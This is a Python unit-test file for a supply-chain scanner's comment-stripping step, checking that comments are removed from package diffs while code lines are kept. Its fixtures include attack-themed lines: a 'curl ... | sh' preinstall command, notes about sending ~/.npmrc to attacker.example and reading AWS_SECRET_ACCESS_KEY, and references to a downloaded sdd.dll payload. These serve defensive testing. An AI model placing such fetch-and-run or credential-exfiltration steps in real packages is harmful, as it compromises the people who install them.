"""
Unit tests for chainwatch.diff.preprocess — the --strip-comments control.

Pure functions over DiffSummary objects: no I/O, no network, no API calls.
The priority under test is "never strip code": every case where the
stripper *could* be wrong must err toward keeping the line.
"""

from __future__ import annotations

from chainwatch.diff.preprocess import strip_comment_lines
from chainwatch.models import DiffSummary, FileDiff


def _diff(path: str, *lines: str, change_type: str = "modified") -> DiffSummary:
    body = "\n".join(lines)
    return DiffSummary(file_diffs=[
        FileDiff(
            path=path,
            change_type=change_type,
            lines_added=sum(1 for line in lines if line.startswith("+")),
            lines_removed=sum(1 for line in lines if line.startswith("-")),
            unified_diff=body,
        )
    ])


def _body(diff: DiffSummary) -> str:
    return diff.file_diffs[0].unified_diff or ""


_HEADER = ("--- a/index.js", "+++ b/index.js", "@@ -1,3 +1,4 @@")


class TestJavaScript:
    def test_strips_whole_line_comments_and_keeps_code(self):
        diff = _diff(
            "index.js",
            *_HEADER,
            " const a = 1;",
            "+// this release harvests ~/.npmrc and posts it to attacker.example",
            "+const b = require('http');",
            "-// old note",
            " module.exports = a;",
        )
        removed = strip_comment_lines(diff)
        assert removed == 2
        body = _body(diff)
        assert "harvests" not in body
        assert "old note" not in body
        assert "+const b = require('http');" in body
        assert " const a = 1;" in body
        # Structure survives: file headers, hunk header, markers.
        assert "--- a/index.js" in body
        assert "@@ -1,3 +1,4 @@" in body
        assert diff.comments_stripped is True
        assert diff.comment_lines_stripped == 2

    def test_strips_block_comment_closed_within_hunk(self):
        diff = _diff(
            "index.js",
            *_HEADER,
            "+/**",
            "+ * Placeholder: the real payload downloads sdd.dll and",
            "+ * runs it via compile.bat.",
            "+ */",
            "+function run() {}",
        )
        assert strip_comment_lines(diff) == 4
        body = _body(diff)
        assert "sdd.dll" not in body
        assert "+function run() {}" in body

    def test_single_line_block_comment(self):
        diff = _diff("index.js", *_HEADER, "+/* eslint-disable */", "+const x = 1;")
        assert strip_comment_lines(diff) == 1
        assert _body(diff).endswith("+const x = 1;")

    def test_block_comment_with_code_after_closer_is_kept(self):
        diff = _diff("index.js", *_HEADER, "+/* a */ const x = 1;")
        assert strip_comment_lines(diff) == 0
        assert "+/* a */ const x = 1;" in _body(diff)

    def test_unclosed_block_comment_is_kept(self):
        diff = _diff(
            "index.js",
            *_HEADER,
            "+/*",
            "+ * this never closes in this hunk",
            " const y = 2;",
        )
        assert strip_comment_lines(diff) == 0

    def test_block_comment_does_not_cross_hunk_boundary(self):
        diff = _diff(
            "index.js",
            *_HEADER,
            "+/*",
            "+ * opened here",
            "@@ -10,2 +11,2 @@",
            "+ */",
            "+code();",
        )
        assert strip_comment_lines(diff) == 0
        assert "+code();" in _body(diff)

    def test_trailing_inline_comment_is_kept(self):
        diff = _diff("index.js", *_HEADER, "+fetch(url); // exfil")
        assert strip_comment_lines(diff) == 0

    def test_added_file_without_diff_headers(self):
        diff = _diff(
            "lib/new.js",
            "+// header prose",
            "+module.exports = 1;",
            change_type="added",
        )
        assert strip_comment_lines(diff) == 1
        assert _body(diff) == "+module.exports = 1;"

    def test_typescript_and_module_variants_share_js_rules(self):
        for path in ("a.ts", "b.tsx", "c.mjs", "d.cjs", "e.jsx"):
            diff = _diff(path, "+// note", "+export const x = 1;", change_type="added")
            assert strip_comment_lines(diff) == 1, path


class TestPython:
    def test_hash_comments_stripped_but_shebang_kept(self):
        diff = _diff(
            "setup.py",
            "+#!/usr/bin/env python",
            "+# -*- coding: utf-8 -*-",
            "+# reads AWS_SECRET_ACCESS_KEY and posts it",
            "+import os",
            change_type="added",
        )
        assert strip_comment_lines(diff) == 2
        body = _body(diff)
        assert "+#!/usr/bin/env python" in body
        assert "AWS_SECRET" not in body
        assert "+import os" in body

    def test_module_docstring_stripped(self):
        diff = _diff(
            "ctx.py",
            '+"""',
            "+This module exfiltrates environment variables.",
            '+"""',
            "+import os",
            change_type="added",
        )
        assert strip_comment_lines(diff) == 3
        assert _body(diff) == "+import os"

    def test_indented_single_line_docstring_stripped(self):
        diff = _diff(
            "ctx.py",
            "+def token():",
            '+    """Return the token."""',
            "+    return 1",
            change_type="added",
        )
        assert strip_comment_lines(diff) == 1
        assert "Return the token" not in _body(diff)

    def test_triple_quoted_assignment_is_kept(self):
        diff = _diff("ctx.py", '+x = """not a docstring"""', change_type="added")
        assert strip_comment_lines(diff) == 0

    def test_single_quote_docstring_variant(self):
        diff = _diff("ctx.py", "+'''", "+prose", "+'''", "+y = 1", change_type="added")
        assert strip_comment_lines(diff) == 3


class TestShellAndBatch:
    def test_shell_hash_comments(self):
        diff = _diff(
            "preinstall.sh",
            "+#!/bin/sh",
            "+# downloads a miner",
            "+curl http://example.invalid/x | sh",
            change_type="added",
        )
        assert strip_comment_lines(diff) == 1
        body = _body(diff)
        assert "+#!/bin/sh" in body
        assert "curl" in body

    def test_batch_rem_and_double_colon(self):
        diff = _diff(
            "preinstall.bat",
            "+REM placeholder describing sdd.dll",
            "+rem lower-case variant",
            "+:: also a comment",
            "+@echo off",
            change_type="added",
        )
        assert strip_comment_lines(diff) == 3
        assert _body(diff) == "+@echo off"

    def test_powershell_block_and_line_comments(self):
        diff = _diff(
            "run.ps1",
            "+<#",
            "+ prose",
            "+#>",
            "+# line",
            "+Invoke-WebRequest x",
            change_type="added",
        )
        assert strip_comment_lines(diff) == 4
        assert _body(diff) == "+Invoke-WebRequest x"


class TestUntouched:
    def test_skipped_oversized_diff_is_untouched(self):
        notice = "[diff skipped: file size 99 bytes exceeds CHAINWATCH_MAX_DIFF_FILE_BYTES=1]"
        diff = _diff("huge.js", notice)
        assert strip_comment_lines(diff) == 0
        assert _body(diff) == notice

    def test_none_diff_is_untouched(self):
        diff = DiffSummary(file_diffs=[
            FileDiff(path="x.js", change_type="removed", lines_added=0, lines_removed=0)
        ])
        assert strip_comment_lines(diff) == 0
        assert diff.file_diffs[0].unified_diff is None

    def test_unknown_extension_is_untouched(self):
        diff = _diff("data.json", "+// not really a comment", change_type="added")
        assert strip_comment_lines(diff) == 0

    def test_line_counts_still_describe_the_real_change(self):
        diff = _diff("index.js", "+// a", "+// b", "+x();", change_type="added")
        strip_comment_lines(diff)
        assert diff.file_diffs[0].lines_added == 3
        assert diff.comment_lines_stripped == 2

    def test_flag_set_even_when_nothing_removed(self):
        diff = _diff("index.js", "+x();", change_type="added")
        assert strip_comment_lines(diff) == 0
        assert diff.comments_stripped is True
        assert diff.comment_lines_stripped == 0
